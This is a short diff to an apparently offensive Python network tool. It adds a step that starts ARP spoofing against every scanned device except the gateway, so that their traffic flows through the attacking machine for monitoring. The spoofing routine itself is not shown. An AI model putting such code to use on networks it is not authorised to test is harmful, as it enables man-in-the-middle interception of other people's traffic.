@@ -489,6 +489,13 @@ def main():
                     if not target_ips and clients:
                         target_ips = [c["ip"] for c in clients if c["ip"] != gateway_ip]
                         print(colored(f"[i] Monitoring all {len(target_ips)} scanned devices.", "blue"))
+                        
+                        # Start ARP spoofing for all targets to capture their traffic
+                        print(colored("[+] Starting ARP spoofing for monitoring...", "cyan"))
+                        for client in clients:
+                            if client["ip"] != gateway_ip:
+                                controller.start_spoofing(client, gateway)
+                        
                     elif not target_ips:
                         print(colored("No devices to monitor. Scan first.", "red"))
                         continue
@@ -497,6 +504,7 @@ def main():
                     monitor.start()
                     print(colored(f"[+] Monitoring {len(target_ips)} device(s)", "green"))
                     print(colored("[!] TIP: Have target devices browse/download to see traffic", "cyan"))
+                    print(colored("[!] ARP spoofing active - traffic now flows through this machine", "yellow"))
 
             elif choice == "5":
                 controller.restore_all()
